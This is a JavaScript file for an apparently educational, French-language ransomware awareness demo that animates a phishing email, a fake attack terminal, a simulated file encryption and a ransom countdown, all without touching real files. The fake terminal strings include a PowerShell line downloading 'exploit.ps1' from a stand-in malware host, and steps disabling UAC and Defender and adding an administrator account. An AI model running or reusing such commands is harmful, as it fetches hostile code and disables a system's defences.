class RansomwareSimulation {
    constructor() {
        this.currentScreen = 0;
        this.screens = ['emailScreen', 'attackScreen', 'encryptScreen', 'ransomScreen', 'finalScreen'];
        this.files = [
            { name: 'contrat_2024.pdf', icon: 'fas fa-file-pdf' },
            { name: 'vacances_famille.jpg', icon: 'fas fa-image' },
            { name: 'budget_annuel.xlsx', icon: 'fas fa-file-excel' },
            { name: 'CV_personnel.docx', icon: 'fas fa-file-word' },
            { name: 'projet_secret.zip', icon: 'fas fa-file-archive' },
            { name: 'scan_passeport.png', icon: 'fas fa-id-card' },
            { name: 'factures_2024.pdf', icon: 'fas fa-file-invoice' },
            { name: 'diplome.jpg', icon: 'fas fa-award' }
        ];
        this.attackCommands = [
            '> Initialisation du payload...',
            '$payload = Invoke-WebRequest -Uri "http://malware-server.com/exploit.ps1"',
            '> Désactivation UAC... OK',
            '> Création utilisateur administrateur... hacker',
            '> Désactivation Windows Defender... OK',
            '> Scan des fichiers personnels... 1278 fichiers trouvés',
            '> Début du chiffrement AES-256...',
            '[████████████████████] 67% - 892/1278 fichiers',
            '> TOUS LES FICHIERS SONT MAINTENANT CHIFFRÉS !',
            '> Note de rançon créée: README_TO_DECRYPT.txt'
        ];
        this.init();
    }

    init() {
        this.bindEvents();
        this.initParticles();
        this.handleResize();
    }

    bindEvents() {
        // ✅ EVENT LISTENERS SUR LES BOUTONS (100% FIABLE)
        const verifyBtn = document.getElementById('verifyBtn');
        const ransomBtn = document.getElementById('ransomBtn');
        const restartBtn = document.getElementById('restartBtn');

        if (verifyBtn) verifyBtn.addEventListener('click', () => this.startAttack());
        if (ransomBtn) ransomBtn.addEventListener('click', () => this.showFinal());
        if (restartBtn) restartBtn.addEventListener('click', () => this.restartSimulation());

        // Raccourcis clavier (pour démo)
        document.addEventListener('keydown', (e) => {
            const key = e.key.toLowerCase();
            if (key === '1') this.showScreen(0);
            else if (key === '2') this.showScreen(1);
            else if (key === '3') this.showScreen(2);
            else if (key === '4') this.showScreen(3);
            else if (key === '5') this.showScreen(4);
            else if (key === 'r') this.restartSimulation();
        });

        // Responsive
        window.addEventListener('resize', () => this.handleResize());
    }

    showScreen(index) {
        if (index < 0 || index >= this.screens.length) return;

        // Masque tous les écrans
        document.querySelectorAll('.screen').forEach(screen => {
            screen.classList.remove('active');
        });

        // Active le nouvel écran avec transition
        const newScreen = document.getElementById(this.screens[index]);
        newScreen.classList.add('active');

        this.currentScreen = index;

        // Lance l'animation spécifique
        setTimeout(() => {
            switch(index) {
                case 1: this.startAttackAnimation(); break;
                case 2: this.startEncryption(); break;
                case 3: this.startRansomCountdown(); break;
            }
        }, 200);
    }

    startAttack() {
        console.log('🚀 Attaque lancée !');
        this.showScreen(1);
    }

    async startAttackAnimation() {
        const terminal = document.getElementById('terminal');
        terminal.innerHTML = '';

        // Effet machine à écrire ultra-réaliste
        for (let i = 0; i < this.attackCommands.length; i++) {
            await this.typeCommand(terminal, this.attackCommands[i], 25 + Math.random() * 15);
            await new Promise(resolve => setTimeout(resolve, 800 + Math.random() * 600));
        }

        // Auto-transition vers chiffrement
        setTimeout(() => {
            console.log('🔒 Début chiffrement...');
            this.showScreen(2);
        }, 1500);
    }

    async typeCommand(element, text, speed = 30) {
        return new Promise(resolve => {
            const line = document.createElement('div');
            line.className = 'command-line';
            element.appendChild(line);

            let i = 0;
            const typeInterval = setInterval(() => {
                if (i < text.length) {
                    line.textContent += text.charAt(i);
                    i++;
                } else {
                    clearInterval(typeInterval);
                    // Curseur clignotant
                    const cursor = document.createElement('span');
                    cursor.className = 'cursor';
                    cursor.textContent = '█';
                    line.appendChild(cursor);
                    
                    setTimeout(() => {
                        cursor.remove();
                        resolve();
                    }, 400);
                }
            }, speed);
        });
    }

    async startEncryption() {
        const filesList = document.getElementById('filesList');
        filesList.innerHTML = '';

        // Ajoute les fichiers un par un
        for (let i = 0; i < this.files.length; i++) {
            await this.addFileToList(this.files[i], i * 180);
        }

        // Lance la barre de progression
        this.animateProgressBar();
    }

    async addFileToList(file, delayMs) {
        return new Promise(resolve => {
            setTimeout(() => {
                const fileElement = document.createElement('div');
                fileElement.className = 'file-item encrypting';
                fileElement.innerHTML = `
                    <i class="${file.icon}"></i>
                    <strong>${file.name}</strong>
                    <span class="status">En attente... ⏳</span>
                `;
                document.getElementById('filesList').appendChild(fileElement);
                resolve();
            }, delayMs);
        });
    }

    animateProgressBar() {
        let progress = 0;
        const progressFill = document.getElementById('progressFill');
        const progressText = document.getElementById('progressText');

        const updateProgress = () => {
            progress += Math.random() * 4 + 1;
            if (progress >= 100) {
                progress = 100;
                progressFill.style.width = '100%';
                progressText.textContent = '100%';
                
                // Transition vers écran rançon
                setTimeout(() => {
                    console.log('💰 Écran rançon...');
                    this.showScreen(3);
                }, 1200);
            } else {
                progressFill.style.width = `${progress}%`;
                progressText.textContent = `${Math.floor(progress)}%`;
                
                // Verrouille les fichiers progressivement
                const files = document.querySelectorAll('.file-item');
                files.forEach((file, index) => {
                    if (progress > (index + 1) * 12) {
                        file.classList.add('locked');
                        file.querySelector('.status').textContent = 'CHIFFRÉ 🔒';
                    }
                });
                
                requestAnimationFrame(updateProgress);
            }
        };
        updateProgress();
    }

    startRansomCountdown() {
        let timeLeft = 1440; // 24 minutes pour démo (1440 secondes)
        const timerEl = document.getElementById('timer');

        const updateTimer = () => {
            const minutes = Math.floor(timeLeft / 60);
            const seconds = timeLeft % 60;
            timerEl.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
            
            if (timeLeft > 0) {
                timeLeft--;
            }
        };

        updateTimer(); // Premier affichage
        const interval = setInterval(updateTimer, 1000);

        // Arrête après 30 secondes pour démo
        setTimeout(() => clearInterval(interval), 30000);
    }

    showFinal() {
        console.log('📚 Écran final éducatif');
        this.showScreen(4);
    }

    restartSimulation() {
        console.log('🔄 Redémarrage...');
        this.showScreen(0);
        
        // Reset des éléments
        document.getElementById('terminal').innerHTML = '';
        document.getElementById('filesList').innerHTML = '';
        document.getElementById('progressFill').style.width = '0%';
        document.getElementById('progressText').textContent = '0%';
    }

    handleResize() {
        document.querySelector('.container').style.height = `${window.innerHeight}px`;
    }

    initParticles() {
        const canvas = document.getElementById('particles');
        if (!canvas) return;

        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;

        const particles = [];
        for (let i = 0; i < 120; i++) {
            particles.push({
                x: Math.random() * canvas.width,
                y: Math.random() * canvas.height,
                vx: (Math.random() - 0.5) * 0.4,
                vy: (Math.random() - 0.5) * 0.4,
                size: Math.random() * 2 + 0.8,
                opacity: Math.random() * 0.4 + 0.1,
                hue: Math.random() * 60 + 180
            });
        }

        const animateParticles = () => {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            
            particles.forEach(particle => {
                particle.x += particle.vx;
                particle.y += particle.vy;
                
                // Rebond aux bords
                if (particle.x < 0 || particle.x > canvas.width) particle.vx *= -1;
                if (particle.y < 0 || particle.y > canvas.height) particle.vy *= -1;
                
                // Dessin
                ctx.save();
                ctx.globalAlpha = particle.opacity;
                ctx.fillStyle = `hsl(${particle.hue}, 60%, 50%)`;
                ctx.shadowBlur = 10;
                ctx.shadowColor = `hsl(${particle.hue}, 60%, 50%)`;
                ctx.beginPath();
                ctx.arc(particle.x, particle.y, particle.size, 0, Math.PI * 2);
                ctx.fill();
                ctx.restore();
            });
            
            requestAnimationFrame(animateParticles);
        };
        animateParticles();

        // Resize handler
        window.addEventListener('resize', () => {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        });
    }
}

// 🚀 LANCEMENT AUTOMATIQUE
document.addEventListener('DOMContentLoaded', () => {
    console.log('🎭 Ransomware Simulation chargée !');
    console.log('⌨️ Raccourcis: 1-5 (écrans), R (restart)');
    
    new RansomwareSimulation();
});

// Gestion des erreurs
window.addEventListener('error', (e) => {
    console.error('Erreur:', e.error);
});